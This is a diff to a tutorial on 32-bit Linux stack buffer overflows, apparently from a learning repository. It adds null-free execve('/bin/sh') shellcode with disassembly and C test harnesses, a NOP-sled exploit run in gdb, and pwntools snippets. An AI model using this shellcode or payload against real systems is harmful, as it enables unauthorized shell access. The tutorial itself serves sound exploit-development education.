@@ -89,7 +89,7 @@ Again, you have a shell, or if this program would be with SUID bit set, you woul
 
 ### Why is this happening?
 
-Programming languages such as C, in which the High-level language instructions map to typical machine language do not provide any mechanism to identify if the buffer (char array) declared on to the stack, can take the input more than was it was supposed to take. The reason for non-checking such sort of mechanism was to achieve speed part to the machine language.
+Programming languages such as C, in which the High-level language instructions map to typical machine language do not provide any mechanism to identify if the buffer (char array) declared on to the stack, can take the input more than was it was supposed to take. The reason for non-checking such sort of mechanism was to achieve speed part of the machine language.
 
 Stack overflow things:
 
@@ -188,13 +188,11 @@ Shellcode:
 ; nasm -f elf32 dirty-low-level-shellcode.asm
 ; ld -m elf_i386 dirty-low-level-shellcode.o -o dirty-low-level-shellcode
 
-; push the string '/bin//sh' which works as well as '/bin/sh' without slash
+; push the string '/bin/sh\0
   push 0x68732f00
   push 0x6e69622f
 ; move the first argument (/bin//sh) to ebx
   mov ebx, esp
-; push zero
-  push 0
 ; push address of the string
   push ebx
 ; move the second argument (argv array) to ecx
@@ -224,30 +222,28 @@ objdump -d dirty-low-level-shellcode.o -M intel | grep '[0-9a-f]:' | grep -v 'fi
 
 objdump listing:
 ```bash
-dirty-low-level-shellcode.o:     file format elf32-i386
+dirty-low-level-shellcode:     file format elf32-i386
 
 
 Disassembly of section .text:
 
-00000000 <.text>:
-   0:	68 00 2f 73 68       	push   0x68732f00
-   5:	68 2f 62 69 6e       	push   0x6e69622f
-   a:	89 e3                	mov    ebx,esp
-   c:	6a 00                	push   0x0
-   e:	53                   	push   ebx
-   f:	89 e1                	mov    ecx,esp
-  11:	b8 0b 00 00 00       	mov    eax,0xb
-  16:	cd 80                	int    0x80
+08049000 <__bss_start-0x1000>:
+ 8049000:	68 00 2f 73 68       	push   $0x68732f00
+ 8049005:	68 2f 62 69 6e       	push   $0x6e69622f
+ 804900a:	89 e3                	mov    %esp,%ebx
+ 804900c:	53                   	push   %ebx
+ 804900d:	89 e1                	mov    %esp,%ecx
+ 804900f:	b8 0b 00 00 00       	mov    $0xb,%eax
+ 8049014:	cd 80                	int    $0x80
 ```
 
 You got the shellcode. Next, you need to test it.
-
 ```C
 #include <stdio.h>
 #include <string.h>
 
 
-unsigned char shellcode[] = "\x68\x00\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x00\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";
+unsigned char shellcode[] = "\x68\x00\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";
 
 void main(){
   printf("Shellcode length: %d\n", strlen(shellcode));
@@ -259,15 +255,17 @@ void main(){
 }
 ```
 
-If you try to compile and execute it, you will end up with a shellcode length of 4 bytes, which is not the true length of the shellcode. Why? The reason is that the shellcode is dirty, not injectable. When you enter shellcode into a vulnerable program, the program prevents you from entering the complete shellcode because it stops accepting characters when it finds a null byte.
+If you try to compile and execute it, you will end up with a shellcode length of 1 bytes, which is not the true length of the shellcode. Why? The reason is that the shellcode is dirty, not injectable. When you enter shellcode into a vulnerable program, the program prevents you from entering the complete shellcode because it stops accepting characters when it finds a null byte.
 
 ### Clean up the assembly to make it smaller and injectable
 
-The reason that the shellcode is not injectable is that we have `mov eax, 0`, `mov eax, 0xb` instructions. These instructions are assembled with the null bytes. So, we need to find another way to move zero and 0xb to the EAX register.
+The reason that the shellcode is not injectable is that we have `push 0x68732f00`, `mov eax, 0xb` instructions. These instructions are assembled with the null bytes. So, we need to find another way to move zero and 0xb to the EAX register.
 
 1. If you need to fill the register with zero value just don't do `mov` instruction and do `xor` on the register.
 
-2. If you need to place a small value in the register don't use the EAX name of the register use al which is 8 bits size or 1 byte.
+2. If you need to place a small value in the register don't use the EAX name of the register use `al` which is 8 bits size or 1 byte.
+
+3. Replace '/bin/sh\0' string with '/bin//sh' and terminate it with null in the stack.
 
 So, clean shellcode will be the following:
 ```nasm
@@ -293,6 +291,44 @@ So, clean shellcode will be the following:
   mov al, 0xb
 ; do interruption
   int 0x80
+```
+
+Disassembly:
+```bash
+clean-low-level-shellcode:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <__bss_start-0x1000>:
+ 8049000:	31 c0                	xor    eax,eax
+ 8049002:	50                   	push   eax
+ 8049003:	68 2f 2f 73 68       	push   0x68732f2f
+ 8049008:	68 2f 62 69 6e       	push   0x6e69622f
+ 804900d:	89 e3                	mov    ebx,esp
+ 804900f:	50                   	push   eax
+ 8049010:	53                   	push   ebx
+ 8049011:	89 e1                	mov    ecx,esp
+ 8049013:	b0 0b                	mov    al,0xb
+ 8049015:	cd 80                	int    0x80
+```
+
+Test the shellcode:
+```C
+#include <stdio.h>
+#include <string.h>
+
+
+unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+void main(){
+  printf("Shellcode length: %d\n", strlen(shellcode));
+  // Declare a function pointer named ret
+  // Then cast the shellcode pointer to the function pointer of the same size
+  int (*ret)() = (int(*)())shellcode;
+  // Call the function
+  ret();
+}
 ```
 
 `test-dirty-shellcode` and `test-clean-shellcode` don't need to be executable, they execute with `Segmentation fault` stuff.
@@ -370,7 +406,6 @@ At this moment, you already have a working shellcode, you know the offset, and s
 NOP is an instruction that does nothing and it means NO-OPERATION. So, you can guess that simply placing this instruction at the beginning of the shellcode will help you to easily exploit the vulnerability.
 
 Let's try it:
-
 ```bash
 gef➤  r < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\xc6\xce\xff\xff"')
 Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\xc6\xce\xff\xff"')
@@ -425,7 +460,6 @@ With pwntools, you can connect to the remote target via ssh or just to send some
 ### Connect to a target
 
 If ssh login is allowed:
-
 ```python
 from pwn import *
 
@@ -437,7 +471,6 @@ con.sendline('echo "hello world!"')
 ```
 
 If the target is open port:
-
 ```python
 from pwn import *
 
@@ -542,7 +575,6 @@ b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89
 ```
 
 Now, with this you can do stack-overflow too easy:
-
 ```python
 from pwn import *
 
@@ -588,4 +620,24 @@ shellcode += shellcraft.mov('al', 0xb)
 shellcode += shellcraft.syscall()
 print(shellcode)
 print(asm(shellcode))
+```
+
+Output:
+```bash
+$ python3 assembly.py
+    xor eax, eax
+    push eax
+    /* push 0x68732f2f */
+    push 0x68732f2f
+    /* push 0x6e69622f */
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    push ebx
+    mov ecx, esp
+    mov al, 0xb
+    /* call syscall() */
+    int 0x80
+
+b'1\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
 ```
